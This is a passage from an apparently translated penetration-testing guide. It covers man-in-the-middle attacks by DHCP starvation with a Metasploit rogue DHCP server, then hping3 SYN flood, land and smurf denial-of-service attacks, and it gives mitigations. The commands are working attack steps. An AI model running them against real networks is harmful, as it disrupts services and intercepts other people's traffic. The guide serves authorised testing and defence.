
![](img/095df2cd1930baecbcecaa51ee3417aa_158_0.png)

This task requires management sign off like we talked about earlier. This task can be disruptive and will exhaust the current DHCP pool as well as redirect all traffic flow on new DHCP leases through your box. You always want to make sure management is okay with this.

2. 在我们的新接口全部设置好并准备就绪后，我们需要确保系统已设置为在线路上转发数据包。我们之前做过这个，所以这里不应该有新内容：

```
sysctl -w net.ipv4.ip_forward=1
```

3. 现在，我们将开始设置 rogue DHCP 服务器。这里需要注意的是，我们暂时不想真正启动服务器。我们只是想确保一切都已准备就绪。我们将通过 Metasploit 来完成此操作。进入 Metasploit 后，我们将设置所需的相关选项：

```
msf > use auxiliary/server/dhcp
msf auxiliary(dhcp) > set DHCPIPSTART 192.168.33.205
DHCPIPSTART => 192.168.33.205
msf auxiliary(dhcp) > set DHCPIPEND 192.168.33.207
DHCPIPEND => 192.168.33.207
msf auxiliary(dhcp) > set srvhost 192.168.33.111
srvhost => 192.168.33.111
msf auxiliary(dhcp) > set netmask 255.255.255.0
netmask => 255.255.255.0
msf auxiliary(dhcp) > set router 192.168.33.1
router => 192.168.33.1
```

4. 现在，在我们启动 rogue DHCP 服务器之前，我们需要耗尽当前的服务器。我将使用 pig.py，这是一个内置的 DHCP 耗尽脚本，多么方便！

```
root@pi-kali:~#pig.py eth0:1
[ -- ] [INFO] - using interface eth0:1
[DBG] Thread0 - (Sniffer) READY
[DBG] Thread1 - (Sender) READY
[--->] DHCP_Discover
[--->] DHCP_Discover
[--->] DHCP_Discover
[<---] DHCP_Offer e0:55:3d:77:04:b5 0.0.0.0 IP:192.168.33.36 for MAC=[de:ad:1a:23:04:dd]
[--->] DHCP_Request 192.168.33.36
[--->] DHCP_Discover
[<---] DHCP_Offer e0:55:3d:77:04:b5 0.0.0.0 IP:192.168.33.37 for MAC=[de:ad:1f:31:cb:a8]
[--->] DHCP_Request 192.168.33.37
[--->] DHCP_Discover
[<---] DHCP_Offer e0:55:3d:77:04:b5 0.0.0.0 IP:192.168.33.38 for MAC=[de:ad:28:23:44:40]
[--->] DHCP_Request 192.168.33.38
```

5. 在当前 DHCP 服务器完全耗尽后，让我们启动我们的 rogue 服务器，看看是否可以发出一些租约并让一些流量通过我们的设备：

```
msf auxiliary(dhcp)> run[*]Auxiliary module execution completed[*]
Starting DHCP server...
msf auxiliary(dhcp)
```

6. 此时，流量应该会通过我们的设备。我将通过两种不同的方式来验证这一点。第一种是检查加入网络的任何新主机的 IP 信息。我想看看新的默认网关是否是我的新子接口：

![](img/095df2cd1930baecbcecaa51ee3417aa_159_0.png)

7. 第二个检查是运行 tcpdump 包，以检查我是否看到流量现在通过我的设备前往互联网。这样，我就能看到我的 DHCP 服务器租约的覆盖范围：

```
root@pi-kali:~#tcpdump -i eth0:1 -icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0:1, link-type EN10MB (Ethernet), capture size 262144 bytes
01:49:49.546152 IP 192.168.33.206 > 8.8.8.8: ICMP echo request, id 377, seq 59, length 64
```

从实验室练习中，你可以看到耗尽公司的 DHCP 服务器、启动自己的服务器并现在处于该段流量中间是多么容易。这是另一种中间人攻击形式。

## 拒绝服务检查

有时，意图并不是入侵系统或窃取任何信息，而是使基础设施瘫痪。网络中的系统可能无法有效处理大量虚假流量，因此会导致 CPU 和内存使用率上升到系统变得不稳定或无法使用的程度。基础设施方面有防止这种情况的方法，因此我将测试基础设施对此类事件的响应情况。

## 使用 hping3 进行各种攻击

hping3 是一个极其灵活的数据包生成工具和协议分析器。此工具可用于多种不同的测试。首先，我们将测试防火墙上的初始连接限制。初始连接是半开连接，这意味着我们只发送 SYN 数据包，之后不再响应。目标是用虚假连接填满防火墙的连接表，使其填满后无法再接受更多连接。使用 hping3，我将针对防火墙生成大量 SYN 连接，以查看其如何处理初始连接。hping3 有很多可用的选项和开关。因此，我不会展示所有选项，而是仅解释我将使用的开关。

![](img/095df2cd1930baecbcecaa51ee3417aa_160_0.png)

在首次运行任何命令之前，请务必查看该工具的手册页，或使用 -help 或 /? 等方式运行命令。命令和开关有时会在新版本发布时发生变化。

运行此测试时，我将使用以下语法：

```
hping3 -c 30000 -d 120 -S -p 22 --flood 192.168.33.1
```

- `-c` - 要发送的数据包数量
- `-d` - 要发送的数据包大小
- `-S` - 仅 SYN 数据包
- `-p` - 使用的端口
- `--flood` - 尽可能快地发送数据包

当我在终端窗口开始运行命令时，我还会对外部主机执行 ping 操作，以验证防火墙是否正确处理连接：

![](img/095df2cd1930baecbcecaa51ee3417aa_161_0.png)

你可以看到，正常情况下为 30 毫秒的 ping 时间现在已超过 200+ 毫秒，而且我甚至开始丢包。这清楚地表明防火墙未正确设置以处理初始连接。黑客可以利用这种情况，因此你需要在最终的 engagement 报告中记录这一点。

![](img/095df2cd1930baecbcecaa51ee3417aa_161_1.png)

缓解这些攻击涉及在适当的 security 设备上设置连接限制，以限制初始连接的数量。你也可以查阅 RFC4987 以获取有关如何缓解 SYN 攻击的更多信息，网址为 https://tools.ietf.org/html/rfc4987。

## 使用 hping3 进行 Land 攻击

hping3 另一个可用的测试是执行 land 攻击。land 攻击是指发送源地址和目的地址完全相同的 IP 地址的数据包。这是一个 IP 欺骗的例子。网络基础设施应设置为拒绝欺骗的数据包。按照最佳安全实践，你的环境中绝不应该有源地址属于你 IP 空间的流量进入。这完全合乎逻辑，因为从逻辑上讲，进入你网络的流量不应该来自你的网络。

要测试你的网络是否允许欺骗，你可以利用 hping3 来检查。这里是我将用于 land 攻击的语法：

```
hping -V -c 100 -d 40 -S -p 139 -s 80 -k -a 192.168.1.129 192.168.1.129
```

- `-V` <-- Verbose
- `-c` --count: 数据包计数
- `-d` --data: 数据大小
- `-S` --syn: 设置 SYN 标志
- `-p` --destport [+] [+] <port> 目标端口（默认 0） ctrl+z 增/减
- `-s` --baseport: 基础源端口（默认随机）
- `-k` --keep 源端口保持不变
- `-a` --spoof 源地址

![](img/095df2cd1930baecbcecaa51ee3417aa_162_0.png)

针对此机制的基础设施保护，基础设施需要在环境中拥有适当的访问控制列表，以不允许源地址通过接口，而这些源地址通常不应该从该接口看到。对于如何防范此问题，你可以查阅 IETF 的 BCP38，网址为 https://tools.ietf.org/html/bcp38。

## 使用 hping3 进行 Smurf 攻击

Smurf 攻击发生在伪造的源地址向广播地址发送大量 ICMP 数据包时。该网络上的主机随后会响应，因为它们应该对广播地址做出响应。这会导致本地 LAN 出现拒绝服务情况。通常，你希望网络设备不要通过接口发送定向广播，这样数据包就会被丢弃且不会发生不良情况。但是，如果未设置该基于基础设施的配置，smurf 攻击将成功。

利用 hping3，以下是设置网络 smurf 攻击的语法：

```
hping3 -1 --flood -a 192.168.33.123 192.168.1.255
```

- **-1 --icmp**: 它是 icmp 模式
- **--flood**: 它尽可能快地发送数据包
- **-a --spoof**: 它伪造源地址

防御此类攻击与在环境中的交换机端口和路由器接口上关闭定向广播一样简单。在 Cisco 环境中，以下命令将有效：

```
Router(config)#interface GigabitEthernet0
Router(config-if)#no ip directed-broadcast
```

## 使用 Macof 进行 MAC Flooding

MAC 地址泛洪是使网络失效的绝佳方式。基本上，通过 MAC 泛洪，你可以将网络变成一个大型集线器。MAC 泛洪的工作原理基本上是允许交换机端口学习其端口上看到的尽可能多的 MAC 地址，如果没有限制，可以填满交换机上的 TCAM 空间。一旦发生这种情况，交换机就会变成集线器，因为它们无法存储端口的 MAC 地址。它们需要将每个数据包发送到每个交换机以尝试将数据包送达。
